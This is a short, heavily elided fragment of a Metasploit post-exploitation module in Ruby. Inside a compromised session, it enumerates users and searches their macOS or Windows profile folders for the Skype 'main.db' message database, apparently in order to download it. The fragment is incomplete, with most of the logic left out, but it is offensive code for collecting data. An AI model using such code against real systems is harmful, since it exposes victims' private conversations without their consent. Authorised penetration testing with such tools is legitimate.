...
class MetasploitModule < Msf::Post
  ...
  def run
    ...
    if session.platform =~ /java/
      ...
      users = get_users.collect { |p| p if p['uid'].to_i > 500 }.compact
      users.each do |p|
  ...
  def download_db(profile)
    if session.type == 'meterpreter'
      file = if session.platform == 'osx'
               session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/", "main.db", true)
             else
               session.fs.file.search("#{profile['AppData']}\\Skype", "main.db", true)
             end
    else
